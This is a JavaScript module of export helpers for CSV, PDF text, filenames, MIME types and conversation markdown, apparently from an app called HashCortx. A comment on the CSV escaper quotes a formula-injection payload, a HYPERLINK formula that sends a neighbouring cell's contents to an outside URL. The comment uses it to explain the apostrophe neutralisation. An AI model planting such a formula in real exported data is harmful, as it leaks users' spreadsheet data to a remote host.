// ==============================================================
// Export formatting — the shared, testable half of every export
//
// HashCortx exports from five places: chat, Coder, Finance, ERP and Virtual
// OS. Each grew its own CSV escaper, its own PDF text handling and its own
// filename logic, so a fix in one never reached the others. Finance already
// had a working PDF text sanitiser; chat and Coder did not, and produced
// mangled text for any curly quote — which is most text a model writes.
//
// These functions are pure: text in, text out, no DOM, no download. That is
// what makes them testable, and export bugs are invisible until someone opens
// the file in Excel a week later.
//
// Checked by scripts/checks/export.mjs.
// ==============================================================

(function () {
  'use strict';

  // ── CSV ──────────────────────────────────────────────────────────────────

  /**
   * Escape one CSV cell, and neutralise spreadsheet formula injection.
   *
   * A cell beginning `=`, `+`, `-`, `@`, tab or CR is executed as a formula by
   * Excel, LibreOffice and Google Sheets. `=HYPERLINK("http://…"&A1,"Click")`
   * in an exported file becomes a live link that leaks the row it sits next to.
   *
   * That is not hypothetical here: these cells come from a language model
   * summarising a document the user supplied, so their content is not under
   * anyone's control. Prefixing an apostrophe is the standard neutralisation —
   * the spreadsheet shows the text and refuses to evaluate it.
   */
  function csvCell(value) {
    let text = value === null || value === undefined ? '' : String(value);
    if (/^[=+\-@\t\r]/.test(text)) text = "'" + text;
    return '"' + text.replace(/"/g, '""') + '"';
  }

  /**
   * Build a whole CSV document.
   *
   * Two details that decide whether the file opens correctly rather than
   * merely existing:
   *
   * - **A byte-order mark.** Without it Excel reads the file as the system
   *   codepage, and every accented character breaks — "Café" arrives as
   *   "CafÃ©". Numbers survive, words do not, which is the worst kind of bug
   *   because the file looks fine at a glance.
   * - **CRLF line endings**, which RFC 4180 specifies and older importers
   *   require.
   *
   * The header row is escaped like any other. It was previously joined raw, so
   * a column label containing a comma silently shifted every value in the file
   * one column left.
   */
  function csvDocument(headers, rows) {
    const lines = [];
    if (Array.isArray(headers) && headers.length) {
      lines.push(headers.map(csvCell).join(','));
    }
    for (const row of rows || []) {
      lines.push((row || []).map(csvCell).join(','));
    }
    return '﻿' + lines.join('\r\n') + '\r\n';
  }

  // ── PDF text ─────────────────────────────────────────────────────────────

  /**
   * Make text safe for jsPDF's built-in fonts.
   *
   * Those fonts are WinAnsi-encoded. Anything outside Latin-1 does not render —
   * it either vanishes or drops the whole run into a fallback that looks like
   * crumbled monospace. Models write curly quotes, en-dashes and ellipses
   * constantly, so untreated text looks broken far more often than not.
   *
   * Characters that have a sensible Latin-1 equivalent are converted rather
   * than dropped. Everything else — emoji, Arabic, CJK — is replaced with a
   * marker instead of disappearing, because a silent hole in an exported
   * document is worse than a visible one: the reader cannot tell that anything
   * is missing.
   */
  function pdfSafe(text) {
    return String(text === null || text === undefined ? '' : text)
      .replace(/[‘’‚‛]/g, "'")
      .replace(/[“”„‟]/g, '"')
      .replace(/[–—―]/g, '-')
      .replace(/…/g, '...')
      .replace(/ /g, ' ')
      .replace(/[•‣◦]/g, '-')
      .replace(/[→⇒]/g, '->')
      .replace(/[≤]/g, '<=')
      .replace(/[≥]/g, '>=')
      .replace(/[×]/g, 'x')
      .replace(/✓|✔/g, '[ok]')
      .replace(/✗|✘|❌/g, '[x]')
      // Emoji and any other non-Latin-1 run: one marker, not one per character.
      .replace(/[^\x00-\xFF]+/g, '[?]');
  }

  /**
   * Flatten markdown for a PDF that has no markdown renderer.
   *
   * Code blocks keep their content and gain a visible frame, because stripping
   * the fence and letting code reflow as prose — which is what happened before
   * — makes it unreadable in an app whose main output is code. Lists keep their
   * markers. Everything else loses its syntax rather than showing it raw.
   */
  function markdownToPlainText(markdown) {
    let text = String(markdown || '');

    // Fenced code: keep the body, mark the boundaries, protect the indentation.
    text = text.replace(/```[ \t]*([\w+-]*)[ \t]*\r?\n([\s\S]*?)```/g, (_m, lang, body) => {
      const label = lang ? `[code: ${lang}]` : '[code]';
      const indented = body.replace(/\r?\n$/, '').split('\n').map(l => '    ' + l).join('\n');
      return `\n${label}\n${indented}\n[end code]\n`;
    });

    return text
      .replace(/`([^`]+)`/g, '$1')
      .replace(/^\s{0,3}(#{1,6})\s+/gm, '')
      .replace(/\*\*([^*]+)\*\*/g, '$1')
      .replace(/(^|[^*])\*([^*\n]+)\*/g, '$1$2')
      .replace(/!\[([^\]]*)\]\([^)]*\)/g, '[image: $1]')
      .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '$1 ($2)')
      .replace(/^\s{0,3}>\s?/gm, '')
      .replace(/^\s{0,3}[-*_]{3,}\s*$/gm, '---')
      .replace(/\n{3,}/g, '\n\n')
      .trim();
  }

  // ── Filenames ────────────────────────────────────────────────────────────

  /**
   * A filename that survives every platform.
   *
   * Windows refuses `< > : " / \ | ? *`, refuses trailing dots and spaces, and
   * reserves CON, PRN, AUX, NUL, COM1-9 and LPT1-9 — a chat innocently titled
   * "aux" produced a file that could not be created at all. Length is capped
   * because a title is often the model's first sentence.
   */
  function safeFilename(title, extension) {
    let stem = String(title || '')
      .normalize('NFKD')
      .replace(/[̀-ͯ]/g, '')
      .replace(/[<>:"/\\|?*\x00-\x1F]/g, ' ')
      .replace(/\s+/g, '-')
      .replace(/-{2,}/g, '-')
      .replace(/^[-.]+|[-.\s]+$/g, '')
      .slice(0, 80);

    if (!stem) stem = 'export';
    if (/^(con|prn|aux|nul|com[1-9]|lpt[1-9])$/i.test(stem)) stem = stem + '-file';
    return extension ? `${stem}.${String(extension).replace(/^\./, '')}` : stem;
  }

  /**
   * The extension of a filename, lowercased, without the dot.
   *
   * A leading dot is a hidden file, not an extension: ".gitignore" has none.
   */
  function extensionOf(filename) {
    const base = String(filename || '').split(/[/\\]/).pop() || '';
    const dot = base.lastIndexOf('.');
    if (dot <= 0 || dot === base.length - 1) return '';
    return base.slice(dot + 1).toLowerCase();
  }

  /**
   * What a file of this name is.
   *
   * Only what this app actually writes. The default is the binary one, because
   * a wrong text type invites something downstream to re-encode the bytes,
   * while an unknown binary is simply handed over untouched.
   */
  const MIME_BY_EXTENSION = {
    md: 'text/markdown;charset=utf-8',
    markdown: 'text/markdown;charset=utf-8',
    txt: 'text/plain;charset=utf-8',
    json: 'application/json;charset=utf-8',
    csv: 'text/csv;charset=utf-8',
    html: 'text/html;charset=utf-8',
    htm: 'text/html;charset=utf-8',
    svg: 'image/svg+xml',
    xml: 'application/xml;charset=utf-8',
    yaml: 'text/yaml;charset=utf-8',
    yml: 'text/yaml;charset=utf-8',
    js: 'text/javascript;charset=utf-8',
    css: 'text/css;charset=utf-8',
    pdf: 'application/pdf',
    png: 'image/png',
    jpg: 'image/jpeg',
    jpeg: 'image/jpeg',
    webp: 'image/webp',
    zip: 'application/zip',
    glb: 'model/gltf-binary',
    gltf: 'model/gltf+json',
    stl: 'model/stl',
    obj: 'text/plain;charset=utf-8',
    docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  };

  function mimeFor(filename) {
    return MIME_BY_EXTENSION[extensionOf(filename)] || 'application/octet-stream';
  }

  /**
   * The filter a native save dialog should show for this name.
   *
   * One entry, matching the extension the caller chose. Offering a list would
   * let the dialog hand back a path with a different extension than the bytes,
   * and null for an unknown extension means the dialog shows everything rather
   * than hiding the file the user is trying to save.
   */
  const FILTER_LABELS = {
    md: 'Markdown', markdown: 'Markdown', txt: 'Text', json: 'JSON', csv: 'CSV',
    html: 'Web page', htm: 'Web page', svg: 'SVG image', xml: 'XML',
    yaml: 'YAML', yml: 'YAML', pdf: 'PDF', png: 'PNG image', jpg: 'JPEG image',
    jpeg: 'JPEG image', webp: 'WebP image', zip: 'Zip archive',
    glb: '3D model', gltf: '3D model', stl: '3D model', obj: '3D model',
    docx: 'Word document', xlsx: 'Excel workbook', pptx: 'PowerPoint deck',
  };

  function dialogFilter(filename) {
    const ext = extensionOf(filename);
    if (!ext) return null;
    return { name: FILTER_LABELS[ext] || ext.toUpperCase(), extensions: [ext] };
  }

  // ── Conversation markdown ────────────────────────────────────────────────

  function fmtDuration(ms) {
    if (!ms || ms < 0) return '';
    return ms < 1000 ? `${Math.round(ms)}ms` : `${(ms / 1000).toFixed(1)}s`;
  }

  /**
   * Render a conversation snapshot as markdown.
   *
   * Turns are separated by a horizontal rule followed by the turn heading.
   * Message bodies are written through untouched: a reply is often a document
   * in its own right, and escaping or fencing its headings to protect the turn
   * structure would damage every real export to guard against a rare one. The
   * rule is what makes the structure unambiguous.
   *
   * Everything the snapshot carries is written out: token counts, timings,
   * attachments, tool calls. An export that silently drops half the run is not
   * a record of it.
   */
  function conversationToMarkdown(snapshot) {
    const out = [];
    out.push(`# ${snapshot.title || 'Conversation'}`);
    out.push('');

    const meta = [];
    if (snapshot.model) meta.push(`- **Model:** \`${snapshot.model}\``);
    if (snapshot.agentName) meta.push(`- **Agent:** ${snapshot.agentName}`);
    if (snapshot.exportedAt) meta.push(`- **Exported:** ${snapshot.exportedAt}`);
    meta.push(`- **Messages:** ${(snapshot.messages || []).length}`);
    const totalIn = (snapshot.messages || []).reduce((n, m) => n + (m.inputTokens || 0), 0);
    const totalOut = (snapshot.messages || []).reduce((n, m) => n + (m.outputTokens || 0), 0);
    if (totalIn || totalOut) meta.push(`- **Tokens:** ${totalIn} in · ${totalOut} out`);
    out.push(meta.join('\n'));
    out.push('');

    for (const m of snapshot.messages || []) {
      const isAssistant = m.role === 'assistant';
      // A horizontal rule before every turn. This is what makes the structure
      // unambiguous: a reply may contain headings of its own, and a rule
      // immediately followed by a turn heading is a shape ordinary prose does
      // not produce. It also reads better than a wall of headings.
      out.push('---');
      out.push('');
      out.push(isAssistant ? '## Assistant' : '## You');

      const detail = [];
      if (m.model && m.model !== snapshot.model) detail.push(`\`${m.model}\``);
      if (m.durationMs) detail.push(fmtDuration(m.durationMs));
      if (m.tps) detail.push(`${m.tps} tok/s`);
      if (m.inputTokens || m.outputTokens) {
        detail.push(`${m.inputTokens || 0} in / ${m.outputTokens || 0} out`);
      }
      if (detail.length) out.push(`*${detail.join(' · ')}*`);
      out.push('');

      if (m.replyTo) {
        const who = m.replyTo.role === 'assistant' ? 'assistant' : 'you';
        out.push(`> Replying to ${who}: ${m.replyTo.preview || ''}`);
        out.push('');
      }

      // The body is written through unchanged. An assistant reply is often a
      // document in its own right — headings, lists, code — and mangling that
      // to protect the turn structure would trade a real cost for a
      // theoretical one. The rule above each turn is what delimits them.
      const body = String(m.content || '').trim();
      out.push(body || '_(empty)_');
      out.push('');

      if (m.attachments && m.attachments.length) {
        const names = m.attachments.map(a => (typeof a === 'string' ? a : a && a.name) || 'file');
        out.push(`**Attachments:** ${names.join(', ')}`);
        out.push('');
      }
      if (m.images && m.images.length) {
        out.push(`**Images:** ${m.images.length} attached`);
        out.push('');
      }
      if (m.toolCalls && m.toolCalls.length) {
        out.push('<details><summary>Tool calls</summary>');
        out.push('');
        for (const call of m.toolCalls) {
          out.push(`- \`${call.name}\`${call.ok === false ? ' — failed' : ''}`);
          if (call.arguments) {
            out.push('  ```json');
            out.push('  ' + JSON.stringify(call.arguments, null, 2).split('\n').join('\n  '));
            out.push('  ```');
          }
        }
        out.push('');
        out.push('</details>');
        out.push('');
      }
    }

    return out.join('\n').replace(/\n{3,}/g, '\n\n').trimEnd() + '\n';
  }

  window.HCExport = {
    csvCell,
    csvDocument,
    pdfSafe,
    markdownToPlainText,
    safeFilename,
    extensionOf,
    mimeFor,
    dialogFilter,
    conversationToMarkdown,
  };
})();
